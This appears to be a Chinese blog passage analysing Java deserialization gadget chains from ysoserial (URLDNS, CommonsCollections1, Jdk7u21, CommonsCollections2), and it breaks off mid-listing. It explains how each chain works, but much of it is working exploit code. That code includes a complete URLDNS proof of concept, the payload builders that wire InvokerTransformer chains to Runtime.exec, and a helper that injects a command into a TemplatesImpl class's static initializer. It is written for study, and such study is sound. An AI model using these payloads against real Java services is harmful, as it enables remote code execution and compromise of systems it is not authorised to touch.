src="https://i.loli.net/2021/09/16/TkyD5gURHJzx4lG.png" ><p>POC 示例</p><ul><li>将 URL 对象作为 HashMap 的 key，反序列化时触发 DNS 查询</li><li>URL 类会缓存 <code>hashCode</code> 的执行结果，存储在一个非 transient 的实例变量中，序列化时写入<ul><li>因此在把 URL 添加到 HashMap 前要重置缓存值（利用反射）</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 0x01.生成 payload</span></span><br><span class="line">        <span class="comment">// 设置一个 hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置可以接收 DNS 查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将 URL 的 hashCode 字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 设置 url 的 hashCode 字段为 0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);  <span class="comment">// 默认为 -1 会触发 DNS 查询，因此修改后 hashMap.put 中就不触发</span></span><br><span class="line">        <span class="comment">// 2. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改 url 的 hashCode 字段为 -1，触发 DNS 查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x03.读取文件，进行反序列化触发 payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS 使用 URL 类对象和 url 值作为 HashMap 对象的 key-value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS.SilentURLStreamHandler 避免在生成 payload 时触发 DNS 查询，返回为空</p><ul><li>规避 DNSLOG</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><blockquote><p>利用 ChainedTransformer 构造恶意调用链<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p></blockquote><p>适用版本</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk1.8 之前</li></ul><p>利用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/O45lTtijsKYwng6.jpg" ><p>ysoserial.payloads.CommonsCollections1 构造 <code>ChainedTransformer</code>（RCE 指令），然后封装到 lazyMap 中。动态代理 AnnotationInvocationHandler 反序列化时会对成员变量 <code>memberValues</code> （代理对象）调用 <code>entrySet</code> 方法，即调用对应 handler 的 invoke 方法，因此用 lazyMap 构造代理。然后会调用 lazyMap 的 handler，也即调用赋值给其 <code>factory</code> 方法的 ChainedTransformer，实现 RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 lazyMap 对象</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// transformerChain 赋值给 lazyMap 的 factory 变量</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态代理</span></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 Map 传入 InvocationHandler 成员变量 memberValues</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="jdk-1-7u21"><a href="#jdk-1-7u21" class="headerlink" title="jdk 1.7u21"></a>jdk 1.7u21</h2><blockquote><p>涉及哈希碰撞和 TemplatesImpl<br>TemplatesImpl 承载恶意调用链，可作为其他 gadget 的“后半”部分</p></blockquote><p>不依赖第三方库，JDK 本身实现的反序列化操作存在安全漏洞。</p><p>fix：AnnotationInvocationHandler 的 <code>readObject</code> 方法增加了异常抛出，之前是直接 return。</p><ul><li>HashMap 构造的 AnnotationInvocationHandler 和 TemplatesImpl 可以存储在 LinkedHashSet 中，在反序列化时通过哈希碰撞（<code>hashCode(f5a5a608)=0</code>）执行下一步；</li><li>在代理对象上调用 <code>equals()</code>，即调用 AnnotationInvocationHandler 的 <code>equalsImpl()</code>，它会 invoke TemplatesImpl 的所有非零参方法，包括 <code>getOutputProperties()</code>；</li><li>上面的步骤会使用 TemplatesImpl 中序列化的恶意字节数组 <code>_bytecodes</code> 作为参数，调用 <code>ClassLoader.declareClass()</code>，最终实现任意代码执行。</li></ul><p>反序列化对象图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet</span><br><span class="line">     |  |</span><br><span class="line">     |  &#96;--&gt; Proxy (Templates) </span><br><span class="line">     |         |</span><br><span class="line">     |         &#96;--&gt; AnnotationInvocationHandler </span><br><span class="line">     |                      |</span><br><span class="line">     |                      &#96;--&gt; HashMap</span><br><span class="line">     |                            |  |</span><br><span class="line">     |                            |  &#96;----&gt; String (&quot;f5a5a608&quot;)</span><br><span class="line">     |                            |</span><br><span class="line">     &#96;-----&gt; TemplatesImpl &lt;------&#96;</span><br><span class="line">                  |</span><br><span class="line">                  &#96;-------&gt; byte[] (malicious class definition)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/oXL5farBdAERI1F.jpg" ><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Jdk7u21</p><p>LinkedHashSet （继承 HashMap 实现）调用 <code>writeObject()</code> 方法序列化时，会依次调用每个元素的 <code>writeObject()</code> ，反序列化时会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 key 放入 HashMap 中。</p><p>HashMap 中添加元素会调用已有元素的 key 作为参数，调用插入元素的 <code>equals()</code> 方法进行比较。因此只要让反序列化时先添加代理对象，再添加恶意代码实例即可。</p><p>普通对象调用 <code>hashCode()</code> 比较，代理对象 AnnotationInvocationHandler 通过 invoke 调用 <code>hashCode</code> ，内部调用 <code>hashCodeImpl()</code>，而其对 memberValues 循环调用 <code>memberValueHashCode()</code>，当其中的对象不是数组时，返回 <code>hashCode</code>。</p><p>为了让 AnnotationInvocationHandler 代理的对象的返回值与普通对象的返回值相等，这就要求 memberValues  中只有一个值，因此只放一个 key 为 <code>f5a5a608</code>，value 为包含恶意代码的 templates 。</p><ul><li>这里是为了能够执行 equals 然后触发 <code>TemplatesImpl.getOutputProperties</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 恶意代码</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希碰撞值</span></span><br><span class="line">String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>); <span class="comment">// value 任意值，让 LinkedHashSet.add 成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 HashMap 创建 AnnotationInvocationHandler</span></span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    <span class="comment">// 设置为 Templates 类型</span></span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 创建 Templates 代理接口</span></span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继承 HashSet</span></span><br><span class="line">LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy); <span class="comment">// 进行一次比较，如果一开始放的 templates 无法添加 proxy</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 放入实际的 value（替换）</span></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.util.Gadgets 使用 javaassist 库创建包含恶意代码的类，恶意代码可以在无参构造函数或 static block 中，将恶意代码添加到 TemplatesImpl 的 <code>_bytecodes</code> 变量中，等反序列化时调用 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 触发恶意代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd); <span class="comment">// 创建 static block</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">   clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字节码</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置进入 defineTransletClasses() 的条件</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>); <span class="comment">// 必须填充</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance()); <span class="comment">// 可选</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><blockquote><p> 利用 TemplatesImpl 承载恶意调用链<br> PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br> 利用 InvokerTransformer 构造比较操作，在比较时触发 transform 操作，进一步触发 TemplatesImpl</p></blockquote><p>适用版本</p><ul><li>commons-collections 4.0<ul><li>CommonsCollections1 可以在该版本复现，改为 <code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code> 设置 factory</li></ul></li><li>jdk7u21<ul><li>使用 TemplatesImpl 的变量 <code>_bytecodes</code> 承载恶意字节码</li></ul></li></ul><p>利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/rP7TSdGYfbiRmD2.png" ><p>ysoserial.payloads.CommonsCollections2 创建 PriorityQueue 对象，并将其 comparator 设置为包含恶意 transformer 对象的 TransformingComparator。</p><p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列）， 当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>  最终通过调用 <code> transformer.transform(TemplatesImpl)</code>实现 RCE。</p><ul><li><code>PriorityQueue.heapify()</code> 用于构造二叉堆</li><li><code>InvokerTransformer.transform(TemplatesImpl) -&gt; TemplatesImpl.newTransformer()</code></li></ul><p>TemplatesImpl 类主要的作用为：</p><ul><li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li><li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 